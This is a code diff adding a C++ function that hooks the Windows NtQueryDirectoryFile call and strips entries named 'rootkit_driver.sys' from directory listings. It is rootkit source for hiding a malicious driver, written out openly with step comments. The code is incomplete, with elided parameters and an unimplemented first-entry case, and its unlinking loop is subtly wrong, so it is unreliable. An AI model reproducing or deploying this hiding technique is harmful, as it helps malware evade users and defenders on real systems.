@@ -1,0 +1,36 @@
+NTSTATUS HookedNtQueryDirectoryFile(
+    HANDLE FileHandle,
+    // ... other parameters ...
+    PVOID FileInformation,
+    ULONG Length,
+    // ...
+) {
+    // Step 1: Call the original function to get the real data
+    NTSTATUS status = OriginalNtQueryDirectoryFile(FileHandle, ..., FileInformation, Length, ...);
+
+    if (NT_SUCCESS(status)) {
+        // Step 2: Iterate through the returned file entries
+        auto pCurrent = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
+        PFILE_BOTH_DIR_INFORMATION pPrevious = nullptr;
+
+        while (pCurrent) {
+            // Step 3: Check if this is the file we want to hide
+            if (CheckFileName(pCurrent->FileName, L"rootkit_driver.sys")) {
+                if (pPrevious) {
+                    if (pCurrent->NextEntryOffset == 0) 
+                        pPrevious->NextEntryOffset = 0; // Last entry
+                    else 
+                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset; // Skip current
+                } else {
+                    // If the first file in the list is the hidden one
+                    // This requires moving the whole buffer up
+                }
+            }
+            
+            if (pCurrent->NextEntryOffset == 0) break;
+            pPrevious = pCurrent;
+            pCurrent = (PFILE_BOTH_DIR_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
+        }
+    }
+    return status;
+}
